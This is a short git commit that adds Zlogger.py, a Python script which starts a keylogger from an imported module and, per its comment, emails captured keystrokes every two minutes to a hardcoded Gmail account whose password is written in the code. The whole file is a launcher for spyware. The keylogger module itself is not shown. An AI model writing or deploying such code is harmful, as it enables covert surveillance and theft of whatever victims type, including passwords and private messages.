a03cda283b13e516aa449175391ac8b77cc52c76
4ur1X <ronit.singh@nyu.edu>
2022-02-12 18:25:19 +0400

    Create Zlogger.py

---
+++ Zlogger.py
@@ -0,0 +1,6 @@
+#!/usr/bin/env python3
+
+import keylogger
+
+my_keylogger = keylogger.Keylogger(120, "jamesbondOO7@gmail.com", "mrbondOO7") # every 2 min. send results via email
+my_keylogger.start()
